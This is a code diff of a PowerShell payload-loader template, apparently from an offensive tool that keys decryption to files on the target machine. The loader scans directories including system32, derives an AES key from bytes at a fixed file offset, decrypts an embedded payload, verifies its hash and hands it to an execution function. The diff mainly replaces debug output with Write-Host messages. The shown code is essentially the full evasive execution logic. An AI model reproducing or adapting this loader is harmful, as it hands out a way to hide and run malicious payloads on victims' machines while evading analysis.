@@ -39,7 +39,6 @@ function Get-DecryptedString($key, $encryptedStringWithIV) {{
     $decryptor = $aesManaged.CreateDecryptor();
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
     $aesManaged.Dispose()
-    #[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
     return $unencryptedData
 }}
 
@@ -55,6 +54,7 @@ function Get-CheckHash($payload, $payload_hash, $minus_bytes) {{
 }}
 
 function Get-CodeExecution($key, $payload){{
+    Write-Host "[*] In code execution function"
 	$encryptedString = "{3}"
 	$decrypted_loader = Get-DecryptedString $key $encryptedString
     $decoded_loader = [System.Text.Encoding]::ASCII.GetString($decrypted_loader)
@@ -63,10 +63,9 @@ function Get-CodeExecution($key, $payload){{
 
 function Get-R-Done($some_dir, $encrypted_msg, $payload_hash, $minus_bytes, $location, $key_len, $key_iterations){{
 	$iteration_temp = $key_iterations
-    $iteration_temp
         
 	# open file
-	"Where", $some_dir
+	Write-Host "[*] Testing:", $some_dir
 	try {{
 		$read_file = [System.IO.File]::ReadAllBytes($some_dir)
 		$keyvalue = $read_file[$location..($location + $key_len - 1)]
@@ -83,7 +82,7 @@ function Get-R-Done($some_dir, $encrypted_msg, $payload_hash, $minus_bytes, $loc
     
     $keyvalue = $sha512.ComputeHash($keyvalue)
     $keyvalue = [System.Convert]::ToBase64String($keyvalue[0..31])
-    "Keyvalue", $keyvalue
+    Write-Host "[*]Keyvalue:" $keyvalue
     
     try {{
         	$payload = Get-DecryptedString $keyvalue $encrypted_msg
@@ -94,7 +93,7 @@ function Get-R-Done($some_dir, $encrypted_msg, $payload_hash, $minus_bytes, $loc
     }}
 
     if ($result -eq 1){{
-        "hashes match"
+        Write-Host "[*] Hashes match!"
         Get-CodeExecution $keyvalue $payload
     }}
            
@@ -102,9 +101,8 @@ function Get-R-Done($some_dir, $encrypted_msg, $payload_hash, $minus_bytes, $loc
 
 function Get-Walk-OS($encrypted_msg, $payload_hash, $minus_bytes, $scan_dir, $key_iterations, $location, $key_len){{
 	$dir_parsing = get-childitem $scan_dir -recurse -force -ErrorAction SilentlyContinue | % {{$_.FullName}}
-	[Environment]::Is64BitProcess
-	#Select-String -Pattern sysnative
-	$sys_paths = @("c:\", "c:\windows", "c:\windows\system32")
+	
+    $sys_paths = @("c:\", "c:\windows", "c:\windows\system32")
 	
 	if ([Environment]::Is64BitProcess -eq 0 -And $sys_paths -contains $scan_dir) {{ # Is a 32bit process
 		$dir_parsing += get-childitem "\Windows\sysnative\" -recurse -force -ErrorAction SilentlyContinue | % {{$_.FullName}}
@@ -118,23 +116,16 @@ function Get-Walk-OS($encrypted_msg, $payload_hash, $minus_bytes, $scan_dir, $ke
 }}
 
 	$lookup_table = [System.Convert]::FromBase64String("{0}")
-	$lookup_table.GetType()
 	$payload_hash = "{1}"
 	$minus_bytes = {2}
 	$scan_dir = "{4}"
 	$key_iterations = {5}
-	#$location = $lookup_table[0..3]
-	#[System.Array]::Reverse($location) # struct.unpack("<I", self.lookup_table[0:4])[0]
-	$lookup_table[0..3]
 	$location = [bitconverter]::ToInt32($lookup_table[0..3], 0)
 	$key_len =  [bitconverter]::ToInt16($lookup_table[4..5], 0)
 	
-	#[System.Array]::Reverse($lookup_table[4..5]) # struct.unpack("<H", self.lookup_table[4:6])[0]
-	"location", $location
-	"key_len", $key_len
 	$encrypted_msg = [System.Text.Encoding]::ASCII.GetString($lookup_table[6..$lookup_table.Length])
-	#$encrypted_msg
-	if ($scan_dir.Contains("%")){{
+	
+    if ($scan_dir.Contains("%")){{
 		$scan_dir = [Environment]::GetEnvironmentVariable($scan_dir -replace "%")
 	}}
 
